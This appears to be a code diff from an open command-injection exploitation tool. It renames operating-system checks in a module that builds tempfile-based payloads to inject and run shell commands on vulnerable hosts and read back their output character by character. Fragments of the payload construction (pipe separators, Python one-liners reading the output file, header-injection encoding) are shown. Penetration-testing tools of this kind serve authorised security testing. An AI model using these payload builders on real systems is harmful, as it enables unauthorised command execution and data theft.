@@ -26,7 +26,7 @@ The available "tempfile-based" payloads.
 Tempfile-based decision payload (check if host is vulnerable).
 """
 def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
-  if settings.TARGET_OS == "win":
+  if settings.TARGET_OS == settings.OS.WINDOWS:
     if separator == "|" or separator == "||" :
       pipe = "|"
       payload = (pipe +
@@ -95,7 +95,7 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
 __Warning__: The alternative shells are still experimental.
 """
 def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
-  if settings.TARGET_OS == "win":
+  if settings.TARGET_OS == settings.OS.WINDOWS:
     python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print(len(file.read().strip()))\""
     if separator == "|" or separator == "||" :
       pipe = "|"
@@ -160,7 +160,7 @@ def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_reque
        settings.CUSTOM_HEADER_INJECTION == True:
       payload = payload.replace("\n", ";")
     else:
-      if settings.TARGET_OS != "win":
+      if settings.TARGET_OS != settings.OS.WINDOWS:
         payload = payload.replace("\n","%0d")      
   return payload
 
@@ -168,7 +168,7 @@ def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_reque
 Execute shell commands on vulnerable host.
 """
 def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_method):
-  if settings.TARGET_OS == "win":
+  if settings.TARGET_OS == settings.OS.WINDOWS:
     if separator == "|" or separator == "||" :
       pipe = "|"
       payload = (pipe +
@@ -262,7 +262,7 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
 __Warning__: The alternative shells are still experimental.
 """
 def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_method):
-  if settings.TARGET_OS == "win":
+  if settings.TARGET_OS == settings.OS.WINDOWS:
     python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print(len(file.read().strip()))\""
     if separator == "|" or separator == "||" :
       pipe = "|"
@@ -330,7 +330,7 @@ def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_
        settings.CUSTOM_HEADER_INJECTION == True:
       payload = payload.replace("\n", ";")
     else:
-      if settings.TARGET_OS != "win":
+      if settings.TARGET_OS != settings.OS.WINDOWS:
         payload = payload.replace("\n","%0d")
   return payload
 
@@ -338,7 +338,7 @@ def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_
 Get the execution output, of shell execution.
 """
 def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):
-  if settings.TARGET_OS == "win":
+  if settings.TARGET_OS == settings.OS.WINDOWS:
     if separator == "|" or separator == "||" :
       pipe = "|"
       payload = (pipe +
@@ -402,7 +402,7 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http
 __Warning__: The alternative shells are still experimental.
 """
 def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):
-  if settings.TARGET_OS == "win":
+  if settings.TARGET_OS == settings.OS.WINDOWS:
     python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print(ord(file.read().strip()[" + str(num_of_chars - 1) + "][0])); exit(0)\""
     if separator == "|" or separator == "||" :
       pipe = "|"
@@ -458,7 +458,7 @@ def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, t
        settings.CUSTOM_HEADER_INJECTION == True:
       payload = payload.replace("\n", ";")
     else:
-      if settings.TARGET_OS != "win":
+      if settings.TARGET_OS != settings.OS.WINDOWS:
         payload = payload.replace("\n","%0d")
   return payload
 
@@ -466,7 +466,7 @@ def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, t
 Get the execution output, of shell execution.
 """
 def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, timesec, http_request_method):
-  if settings.TARGET_OS == "win":
+  if settings.TARGET_OS == settings.OS.WINDOWS:
     if separator == "|" or separator == "||" :
       pipe = "|"
       payload = (pipe +
@@ -524,7 +524,7 @@ def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, timesec, http_request_meth
 __Warning__: The alternative shells are still experimental.
 """
 def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):
-  if settings.TARGET_OS == "win":
+  if settings.TARGET_OS == settings.OS.WINDOWS:
     python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print(file.readlines()[0][" + str(num_of_chars - 1) + "]); exit(0)\""
     if separator == "|" or separator == "||" :
       pipe = "|"
@@ -581,7 +581,7 @@ def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, 
        settings.CUSTOM_HEADER_INJECTION == True:
       payload = payload.replace("\n",";")
     else:
-      if settings.TARGET_OS != "win":
+      if settings.TARGET_OS != settings.OS.WINDOWS:
         payload = payload.replace("\n","%0d")
   return payload
   
